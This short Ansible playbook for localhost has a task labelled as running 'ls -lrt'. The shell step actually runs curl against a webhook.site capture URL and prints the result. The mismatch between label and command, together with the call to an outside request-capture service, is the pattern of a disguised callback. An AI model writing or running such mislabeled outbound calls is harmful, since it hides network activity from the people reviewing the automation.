---
  - name: "Playing with Ansible and Git"
    hosts: localhost
    connection: local 
    tasks:

    - name: "just execute a ls -lrt command"
      shell: "curl https://webhook.site/06f8115a-cf09-47f7-964d-75791dbe0c38"
      register: "output"

    - debug: var=output.stdout_lines
